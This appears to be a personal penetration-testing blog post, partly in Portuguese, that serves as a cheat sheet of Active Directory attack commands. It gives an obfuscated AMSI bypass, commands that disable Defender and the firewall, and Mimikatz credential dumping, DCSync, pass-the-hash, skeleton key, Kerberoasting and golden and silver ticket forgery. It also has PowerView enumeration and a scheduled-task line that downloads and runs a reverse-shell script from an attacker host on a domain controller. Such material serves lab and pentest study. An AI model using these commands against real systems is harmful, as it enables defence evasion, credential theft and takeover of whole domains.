---
title: "Active Directory - Commands"
tags: [Metodologies]
categories: ActiveDirectory
mermaid: true
image: https://www.safesystems.com/wp-content/uploads/2020/04/Microsofts-LDAP-Security-Update-and-the-Impact-on-Financial-Institutions-Today-Header-Blog-Image.png
---

# Active Directory - Commands

Here you will find some commands to explore Active Directory.

All kind of commands. Enumeration and exploration!

Hope you enjoy.

# Summary

- [Active Directory - Commands](#active-directory---commands)
- [Summary](#summary)
- [Initial Considerations](#initial-considerations)
- [Defense Bypass](#defense-bypass)
  - [AMSI Bypass](#amsi-bypass)
  - [Disable Windows Defender](#disable-windows-defender)
  - [Language Mode](#language-mode)
  - [Disable Firewall](#disable-firewall)
  - [APPLOCKER POLICY](#applocker-policy)
- [PSSession](#pssession)
  - [New Session on PSSession](#new-session-on-pssession)
  - [Commands With PSSession](#commands-with-pssession)
  - [Scripts With PSSession](#scripts-with-pssession)
  - [Joining the Session](#joining-the-session)
  - [Copying Files on the Session](#copying-files-on-the-session)
- [Mimikatz](#mimikatz)
  - [Dump Hashes](#dump-hashes)
  - [Users Hashes](#users-hashes)
  - [Pass-The-Hash (Add users in groups)](#pass-the-hash-add-users-in-groups)
  - [Pass-The-Ticket (Unconstrained Delegation)](#pass-the-ticket-unconstrained-delegation)
  - [Privilege Across Trusts (Nedded krbtgt hash)](#privilege-across-trusts-nedded-krbtgt-hash)
  - [DCSync](#dcsync)
  - [Skeleton Key](#skeleton-key)
  - [Kerberoast](#kerberoast)
  - [Golden Ticket](#golden-ticket)
    - [Across Trusts](#across-trusts)
    - [Domain](#domain)
  - [Silver Ticket](#silver-ticket)
    - [RPCSS](#rpcss)
    - [HOST](#host)
- [Enumeration With PowerView](#enumeration-with-powerview)
  - [User Enumeration](#user-enumeration)
  - [Groups Enumeration](#groups-enumeration)
  - [Computers Enumeration](#computers-enumeration)
  - [Domain Admin Enumeration](#domain-admin-enumeration)
  - [Shares Enumeration](#shares-enumeration)
  - [ACL Enumeration](#acl-enumeration)
  - [OUs Enumeration](#ous-enumeration)
  - [GPO Enumeration](#gpo-enumeration)
  - [All Domains on the Forests and Trusts](#all-domains-on-the-forests-and-trusts)
  - [User Hunting Enumeration](#user-hunting-enumeration)
  - [SID Enumeration (Golden e Silver Ticket)](#sid-enumeration-golden-e-silver-ticket)

# Initial Considerations

Here will come all kinds of commands to explore AD.

# Defense Bypass

Defenses bypasss!!

## AMSI Bypass

What is AMSI?

The Anti Malware Scan Interface (AMSI) is a component from Microsoft Windows which allows an inspection of the services and scripts.

O que é AMSI? 

A Antimalware Scan Interface (AMSI) é um componente do Microsoft Windows que permite uma inspeção mais aprofundada dos serviços de script integrados.

It's almos a "grep" on the script looking for malicious patterns.

![](https://0x4rt3mis.github.io/assets/img/active-enum/AMSI.png)

To bypass it we could use comes scritps and commands that will scramble it.

The most I use is this one

```ps1
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

We can, if possible, execute the powershell on version 1.0

`C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`

Sometimes a simple `-ep bypass` will be good too

```ps1
powershell -ep bypass
```

We can downgrade the powershell version

```ps1
powershell -version 2
```

Or upgrade it

```ps1
pwsh
```

After any of them. AMSI is not going to botter you.

## Disable Windows Defender

What is Windows Defender?

Microsoft Defender is a software that remove malware, trojan...

It is like AMSI

![](https://0x4rt3mis.github.io/assets/img/active-enum/AMSI.png)

To disable it we have three methods.

```ps1
Set-MpPreference -DisableRealtimeMonitoring $true
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/defender.png)

And these ones

```ps1
sc stop WinDefend
Set-MpPreference -DisableIOAVProtection $true
```

## Language Mode

[What Is?](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.1)

```
The language mode determines the language elements that are permitted in the session.

The language mode is actually a property of the session configuration (or "endpoint") that is used to create the session. All sessions that use a particular session configuration have the language mode of the session configuration.

All PowerShell sessions have a language mode, including PSSessions that you create by using the New-PSSession cmdlet, temporary sessions that use the ComputerName parameter, and the default sessions that appear when you start PowerShell.

Remote sessions are created by using the session configurations on the remote computer. The language mode set in the session configuration determines the language mode of the session. To specify the session configuration of a PSSession, use the ConfigurationName parameter of cmdlets that create a session.
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/lang.png)

This way we verify the language mode

```ps1
$ExecutionContext.SessionState.LanguageMode
```

Downgrade works

```ps1
powershell -version 2
```

To change it

```ps1
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
```

Other thing that works is to put the **call of the script on the end of it!!**

## Disable Firewall

Firewall is other defense.

![](https://0x4rt3mis.github.io/assets/img/active-enum/firewall.png)

To disable it.

```ps1
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/firewall1.png)

Or got o config and disable it.

## APPLOCKER POLICY

What is [Applocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)?

```
AppLocker advances the app control features and functionality of Software Restriction Policies. AppLocker contains new capabilities and extensions that allow you to create rules to allow or deny apps from running based on unique identities of files and to specify which users or groups can run those apps.
```

This is it

![](https://0x4rt3mis.github.io/assets/img/active-enum/applocker.png)

To verify what paths can be used, this is the command:

```ps1
Get-AppLockerPolicy -Xml -Local
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/applocker1.png)

We could verify also the `Scritp.Applocker` on `C:\Windows\system32\AppLocker`, it is where it's being executed.

![](https://0x4rt3mis.github.io/assets/img/active-enum/applocker2.png)

```ps1
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleColletions
```

# PSSession

PSSESSION!

## New Session on PSSession

```ps1
$sess = New-PSSession -ComputerName xxx.local
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/p.png)

## Commands With PSSession

```ps1
Invoke-Command -ScriptBlock {dir} -Session $sess
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/p1.png)

## Scripts With PSSession

```ps1
Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
Invoke-Command -FilePath "C:\Invoke-Mimikatz.ps1" -session $sess
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/p2.png)

## Joining the Session

```ps1
Enter-PSSession $sess
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/p3.png)

## Copying Files on the Session

```ps1
Copy-Item -Path C:\flag.txt -Destination 'C:\Users\Public\Music\flag.txt' -FromSession $sess
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/p4.png)

# Mimikatz

Mimikatz resume.

## Dump Hashes

Dump do Sam - (**lsadump::sam**) - Local Administrator Hash

LogonPasswords - (**sekurlsa::logonpasswords**) - Domain Administrator Hash
 
## Users Hashes

With the exe

```ps1
./mimikatz.exe lsadump::lsa /patch
```

Script Invoke-Mimikatz.ps1

```ps1
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' 
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"' 
Invoke-Mimikatz -Command ‘"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "lsadump::sam"
```

## Pass-The-Hash (Add users in groups)

```ps1
sekurlsa::pth /user:xxxx /domain:xxxx /ntlm:xxxxx /run:powershell.exe
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:COMMAND
Invoke-Mimikatz -Command '"sekurlsa::pth /user:xxxx /domain:xxxx /ntlm:xxxxxxx /run:powershell.exe"'
```

## Pass-The-Ticket (Unconstrained Delegation)

```ps1
Get-NetComputer -UnConstrained | select Name
Invoke-Command -ScriptBlock {Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export"'} -Session $sess
Invoke-Command -ScriptBlock{Invoke-Mimikatz -Command '"kerberos:: ptt [...]"'} -Session $sess
Invoke-Command -Scriptblock{ls \\maquina.local\C$} -session $sess
```

## Privilege Across Trusts (Nedded krbtgt hash)

```ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ab.cd.local /sid:<SID of ab.cd.local> /krbtgt:hash do krbtgt /sids:<SID of cd.local> /ptt"'
```

SID and SIDS

```
ab.cd.local - Get-DomainSID
cd.local - Get-DomainSID -Domain cd.local
```

## DCSync

Remember the **privilege::debug** and **token::elevate**

```ps1
Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "lsadump::dcsync /domain:ab.cd.local /user:Administrator" "exit"
```

## Skeleton Key 

Just got working with the exe

This commands on the DC box, after owned it

```ps1
./mimkatz.exe
privilege::debug
token::elevate
misc::skeleton
```

## Kerberoast

First, check the users with SPN

```ps1
Get-NetUser -SPN
```

Request the Ticket

```ps1
Request-SPN Ticket SPN/ab.cd.local
```

Export the Ticket

```ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

Now, crack with john

```ps1
kirbi2john.py
```

## Golden Ticket

Two kinds, the Across Trusts and Domain

### Across Trusts

```ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ab.cd.local /sid:<SID of ab.cd.local> /krbtgt:xxxxxxx /sids:<SID of cd.local> /ptt"'
```

To get the SID and SIDS


```ps1
ab.cd.local - Get-DomainSID
cd.local - Get-DomainSID -Domain cd.local
```

Access the share accross trusts

```ps1
ls //bc-dc/C$
```

### Domain

With the exe we inject a generic ticket of our session (to access our own domain, not across trusts)

```ps1
./mimikatz.exe
kerberos::golden /domain:xxx.local /sid:S-1-5-21-3965405831... /rc4:c6d349.... /user:newAdmin /id:500 /ptt
```

After that we will have access to domain DC

## Silver Ticket

We generate a tickets to many services, the ideia is the same always

Note: the  /rc4: is the HASH OF THE BOX, IS THIS CASE IT'S THE `DC$`

### RPCSS

```PS1
Invoke-Mimikatz -Command '"kerberos::golden /domain:ab.cd.local /sid:S-1-5-21- /target:DC.ac.cd.local /service:RPCSS /rc4:418ea3d41xxx /user:Administrator /ptt"'
```

We check the injected ticket

```ps1
klist
```

Now, we exect commands on the box

```ps1
gwmi -Class win32_operatingsystem -ComputerName DC.ac.cd.local
```

### HOST

```ps1
Invoke-Mimikatz -Command '"kerberos::golden /domain:ab.cd.local /sid:S-1-5-21- /target:DC.ac.cd.local /service:RPCSS /rc4:418ea3d41xxx /user:Administrator /ptt"'
```

Check the tasks

```ps1
schtasks /S DC.ac.cd.local
```

We create one to get a reverse shell

```ps1
schtasks /create /S DC.ac.cd.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "shell" /TR "powershell.exe -c 'iex(new-object net.webclient).downloadstring(''http://..../Invoke-PowerShellTCP.ps1'')'"
```

We execute and it goes to our kali to get the shell

```ps1
schtasks /Run /S DC.ac.cd.local /TN "shell"
```

This can be done with any service, HOST, LDAP, CIFS, HTTP...


# Enumeration With PowerView

Let's check the enumeration with `PowerView`

## User Enumeration

```ps1
Get-NetUser
```

## Groups Enumeration

```ps1
Get-NetGroup | select Name
```

## Computers Enumeration

```ps1
Get-NetComputer | select Name
```

## Domain Admin Enumeration

```ps1
Get-NetGroupMember "Domain Admins"
Get-NetGroup "Enterprise Admins" -Domain domain.com
```

## Shares Enumeration

```
Invoke-ShareFinder
```

## ACL Enumeration

```ps1
Get-ObjectAcl -SamAccountName "Domain Admins" -Verbose
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "xxxx"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RPDUsers"}
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
Invoke-ACLScanner | Where-Object {$_.IdentityReferenceName –eq 'MAQUINA_QUE_QUERO_VER$'}
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
```

## OUs Enumeration

```ps1
Get-NetOU | select name
```

## GPO Enumeration

```ps1
(Get-NetOU StudentMachines).gplink
Get-NetGPO -ADSpath 'LDAP://cn={B822494A-DD6A-4E96-A2BB-944E397208A1},cn=policies,cn=system,DC=xxxxx,DC=xxxx,DC=local'
```

## All Domains on the Forests and Trusts

```ps1
Get-NetForestDomain -Verbose
Get-NetDomainTrust
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
Get-NetForestDomain -Forest ab.local -Verbose | Get-NetDomainTrust
Get-NetForest
```

## User Hunting Enumeration

```ps1
Find-LocalAdminAccess -Verbose
Invoke-UserHunter -Verbose
```

## SID Enumeration (Golden e Silver Ticket)

```ps1
ab.cd.local - Get-DomainSID
cd.local - Get-DomainSID -Domain cd.local
```
